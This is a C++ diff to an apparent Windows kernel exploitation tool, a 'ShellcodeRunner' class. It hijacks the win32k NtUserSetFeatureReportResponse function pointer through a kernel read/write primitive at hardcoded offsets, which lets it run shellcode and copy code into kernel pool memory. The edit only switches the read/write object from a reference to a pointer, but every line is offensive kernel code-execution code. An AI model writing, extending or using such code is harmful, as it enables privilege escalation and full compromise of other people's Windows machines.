@@ -17,7 +17,7 @@ constexpr ULONG NtUserSetFeatureReportResponseOffset = 0x1C02446C0;
 constexpr ULONG ExAllocatePoolWithTagOffset = 0x9B5030;
 constexpr ULONG MemoveOffset = 0x40F440;
 
-ShellcodeRunner::ShellcodeRunner(KernelReadWrite& ReadWrite) : rw(std::move(ReadWrite)), originalFunction(0), win32kBase(0), NtUserSetFeatureReportResponse(nullptr) {
+ShellcodeRunner::ShellcodeRunner(KernelReadWrite* ReadWrite) : rw(std::move(ReadWrite)), originalFunction(0), win32kBase(0), NtUserSetFeatureReportResponse(nullptr) {
 	auto bases = PeUtils::GetKernelModuleAddresses();
 	kernelBase = std::get<0>(bases);
 	win32kBase = std::get<1>(bases);
@@ -47,7 +47,7 @@ VOID ShellcodeRunner::RunShellcode(const PVOID Shellcode, ULONG ShellcodeLength,
 }
 
 ULONG64 ShellcodeRunner::RunFunction(ULONG64 NewPointer, ULONG64 Param1, ULONG64 Param2, ULONG32 Param3) {
-	rw.WriteQword(win32kBase + NtUserSetFeatureReportResponseOffset, reinterpret_cast<PVOID>(NewPointer));
+	rw->WriteQword(win32kBase + NtUserSetFeatureReportResponseOffset, reinterpret_cast<PVOID>(NewPointer));
 	return NtUserSetFeatureReportResponse(Param1, Param2, Param3);
 }
 
@@ -60,5 +60,5 @@ PVOID ShellcodeRunner::CopyToPool(const PVOID Source, ULONG Size) {
 }
 
 ShellcodeRunner::~ShellcodeRunner() {
-	rw.WriteQword(win32kBase + NtUserSetFeatureReportResponseOffset, reinterpret_cast<PVOID>(originalFunction));
+	rw->WriteQword(win32kBase + NtUserSetFeatureReportResponseOffset, reinterpret_cast<PVOID>(originalFunction));
 }
